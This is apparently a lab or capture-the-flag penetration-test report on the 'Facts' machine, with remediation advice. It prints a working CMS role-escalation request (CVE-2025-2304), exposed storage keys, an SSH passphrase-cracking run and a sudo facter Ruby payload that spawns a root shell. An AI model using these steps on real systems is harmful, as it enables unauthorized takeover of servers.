# Facts - Vulnerability Assessment Report

**Author:** Dan Schvetz  
**Date:** 22-06-2026  
**Target IP:** 10.129.26.214  
**OS:** Linux (Ubuntu 25.04)  
**Difficulty:** Easy  

---

## 1. Executive Summary

**Objective:** To perform a vulnerability assessment and network penetration test against the target machine "Facts" to identify security weaknesses and evaluate the overall risk to the infrastructure.

**Outcome:** The Linux target was successfully compromised, resulting in full `root` access. 

**Key Findings:** The initial compromise was achieved by exploiting a Mass Assignment vulnerability (CVE-2025-2304) in the Camaleon CMS, elevating privileges to an administrative role. This led to the discovery of cleartext AWS/MinIO credentials, which were used to access an internal S3 bucket containing an encrypted SSH private key. After offline-cracking the key's weak passphrase, a user-level foothold was established. Privilege escalation was subsequently achieved by exploiting a misconfigured `sudo` permission on the `facter` binary to execute an arbitrary Ruby payload as root.

| Risk Metric | Status |
| :--- | :--- |
| **Overall Risk Rating** | **Critical** |
| **Initial Access Vector** | Mass Assignment (CVE-2025-2304) / CMS Admin Takeover |
| **Lateral Movement** | Hardcoded Credentials / Weak Passphrase |
| **Privilege Escalation** | Sudo Misconfiguration (Arbitrary Code Execution) |

---

## 2. Methodology & Scope

* **Scope:** 10.129.26.214 (`facts.htb`)
* **Methodology:**
    1.  Information Gathering & Enumeration
    2.  Vulnerability Analysis
    3.  Exploitation (Initial Access)
    4.  Post-Exploitation & Privilege Escalation
    5.  Reporting & Remediation

---

## 3. Attack Narrative (Technical Walkthrough)

### 3.1 Reconnaissance & Enumeration
*Initial network scanning and service identification.*

**Port Scanning:**
An initial TCP port scan was conducted, revealing services indicative of a Linux web server and a MinIO storage instance.

```
# nmap -sC -sV -A -Pn -p- --min-rate 1000 10.129.26.214

Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 13:55 -0400
Nmap scan report for 10.129.26.214
Host is up (0.063s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    Golang net/http server
|     Server: MinIO
```
*Figure 1: Nmap scan identifies standard Linux ports (SSH, HTTP) and a MinIO service.*

**Web Enumeration:**
After adding `facts.htb` to `/etc/hosts`, source code inspection of the main web page revealed a stylesheet path indicating the use of Camaleon CMS. 

```
<link rel="stylesheet" href="/assets/themes/camaleon_first/assets/css/main-41052d2acf5add707cadf8d1c12a89a9daca83fb8178fdd5c9105dc6c566d25d.css" />
```
*Figure 2: Source code snippet revealing the Camaleon CMS theme.*

Registering a new user account and navigating to `facts.htb/admin` confirmed the software version as **2.9.0**, which is publicly known to be vulnerable to CVE-2025-2304.

### 3.2 Initial Access (Exploitation)
*Execution of the identified vulnerabilities to achieve a user-level foothold.*

**Vulnerability Discovery (Mass Assignment / Role Escalation):**
CVE-2025-2304 allows unprivileged users to modify their role parameter during a profile update. The password change request was intercepted using Burp Suite to analyze the payload structure.

```
_method=patch&authenticity_token=tTlcuPreLtP9RyAu0sfr4yF8QVBT1Z510gUcENkJ6KONU1nxDVqqujsn0JlW--iG5c8t_3g43zvPNBgJq_GmEQ&password%5Bpassword%5D=test3&password%5Bpassword_confirmation%5D=test3&password[role]=admin
```
*Figure 3: Intercepted HTTP PATCH request during password update with the injected role parameter.*

**Exploitation Step-by-Step:**
1.  The `password[role]=admin` parameter was injected into the POST body. Upon sending the request and relogging, full administrative privileges were successfully granted.
2.  Navigating to **Settings -> General Site -> Filesystem Settings** exposed internal AWS S3 (MinIO) credentials (`AKIAADC47BDD68E6BE85` : `emzyTzH7O3Zeed2KMD+3ttEDkD+R3qQEpTdiPnX6`) and the local endpoint.
3.  The `aws` CLI was configured locally to enumerate the S3 buckets, revealing an `internal` bucket containing an SSH private key (`id_ed25519`), which was subsequently downloaded.

```
# aws --profile facts --endpoint-url=http://facts.htb:54321 s3 ls internal/.ssh/
2026-06-22 15:07:04         82 authorized_keys
2026-06-22 15:07:04        464 id_ed25519

# aws --profile facts --endpoint-url=http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```
*Figure 4: S3 enumeration and extraction of the encrypted SSH private key.*

### 3.3 Privilege Escalation
*Lateral movement and elevation to administrative access.*

**Internal Enumeration & Key Cracking:**
The downloaded SSH private key was protected by a passphrase. Using `ssh2john` and John the Ripper, the hash was subjected to an offline dictionary attack using the `rockyou.txt` wordlist, successfully recovering the passphrase (`dragonballz`).

```
# ssh2john id_ed25519 > hash.txt

# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
dragonballz      (id_ed25519)     
1g 0:00:01:58 DONE (2026-06-22 15:27) 0.008429g/s 26.97p/s 26.97c/s 26.97C/s grecia..imissu
```
*Figure 5: Successful offline crack of the SSH key passphrase.*

Using the cracked key, SSH access was established as the user `trivia`, capturing the user flag. Further enumeration via `sudo -l` revealed that `trivia` could execute the `/usr/bin/facter` binary as `root` without a password.

**The Flaw (Facter Arbitrary Code Execution):**
The `facter` utility is designed to load custom system facts written in Ruby. Because the binary runs with `sudo` privileges, utilizing the `--custom-dir` flag forces `facter` to parse and evaluate any Ruby script (`.rb` file) placed inside that directory with full `root` permissions.

**Exploitation:**
A temporary directory (`/tmp/test`) was created, and a malicious Ruby script (`exploit.rb`) containing a system execution call was written to it. Executing the `facter` binary and pointing it to this directory triggered the payload, immediately spawning a `root` shell.

```
trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

trivia@facts:~$ mkdir /tmp/test
trivia@facts:~$ echo 'exec("/bin/bash")' > /tmp/test/exploit.rb
trivia@facts:~$ sudo facter --custom-dir /tmp/test
root@facts:/home/trivia# whoami
root

root@facts:/home/trivia# cat /root/root.txt
34c3b0691fcf2312e18017a1266684d6
```
*Figure 6: Payload creation and execution of the sudo facter GTFObin to achieve root.*

---

## 4. Vulnerability Details & Remediation

### Vulnerability 1: Mass Assignment / Privilege Escalation (CVE-2025-2304)
* **Severity:** High

**Description:**
Camaleon CMS versions up to 2.9.0 suffer from a Mass Assignment vulnerability. The application fails to properly filter user-supplied input during profile updates, allowing an attacker to inject arbitrary parameters into the backend database query. By injecting `password[role]=admin` into the HTTP PATCH request, an unprivileged user can force the application to elevate their account to full administrative privileges.

**Business Impact:**
An unauthenticated or low-privileged user can gain full administrative control over the Content Management System. This allows for site defacement, malware distribution to site visitors, and access to sensitive backend configurations.

**Remediation:**
* **Patching:** Upgrade Camaleon CMS to version 2.9.1 or the latest stable release where this vulnerability is addressed.
* **Strong Parameters:** Ensure the underlying Ruby on Rails application utilizes "Strong Parameters" to strictly whitelist which attributes can be modified via user input. The `role` attribute must be explicitly excluded from user-controllable model updates.

### Vulnerability 2: Hardcoded Cloud Infrastructure Credentials (CMS)
* **Severity:** Critical

**Description:**
Administrative access to the CMS exposed backend MinIO (S3) access keys and secret keys in cleartext via the GUI Filesystem Settings. 

**Business Impact:**
Exposure of these credentials grants an attacker direct access to internal cloud storage infrastructure, entirely bypassing external perimeter controls and network segmentation.

**Remediation:**
* **Credential Management:** Remove hardcoded cloud credentials from application databases and UI components. Utilize IAM roles, short-lived STS tokens, or dedicated secrets management services to handle backend integration.

### Vulnerability 3: Insecure Storage of Private Keys & Weak Cryptographic Passphrase
* **Severity:** High

**Description:**
The `internal` S3 bucket accessed via the exposed credentials was storing sensitive infrastructure files, including a user's SSH private key (`id_ed25519`). Furthermore, the SSH key was protected with a highly predictable passphrase ("dragonballz") that was trivially cracked offline using a standard wordlist.

**Business Impact:**
The presence of weak, crackable SSH keys within internal storage directly facilitates lateral movement and unauthorized remote access to the underlying server hosting the application.

**Remediation:**
* **Remove Sensitive Files:** SSH private keys should never be stored in shared or general-purpose buckets. Keys should be generated locally on the required machines and only the public keys should be distributed.
* **Passphrase Complexity:** Enforce strong passphrases (minimum 20 characters, highly entropic) on all private keys to mathematically defeat offline dictionary and brute-force attacks if the file is ever compromised.

### Vulnerability 4: Sudo Misconfiguration (Facter Arbitrary Code Execution)
* **Severity:** High

**Description:**
The local user `trivia` was granted `NOPASSWD` `sudo` rights to the `/usr/bin/facter` binary. Facter is designed to load custom system facts written in Ruby. An attacker can create a malicious Ruby `.rb` file, place it in a temporary directory, and force `facter` to execute it as root by utilizing the `--custom-dir` argument, resulting in a full system compromise.

**Business Impact:**
A compromised low-privileged user account can instantly elevate its privileges to root. This results in total control over the host operating system, allowing the attacker to exfiltrate any data, pivot to other internal network segments, or install persistent backdoors.

**Remediation:**
* **Revoke Sudo Permissions:** If the `trivia` user does not strictly require `root` access to run `facter`, remove the entry from the `/etc/sudoers` file.
* **Command Restriction:** If `facter` must be run by this user, do not allow arbitrary flags. Restrict the `sudoers` entry to a highly specific command string that prevents the use of `--custom-dir` and `--external-dir`. For example: 
  `trivia ALL=(root) NOPASSWD: /usr/bin/facter [specific-safe-flag]`
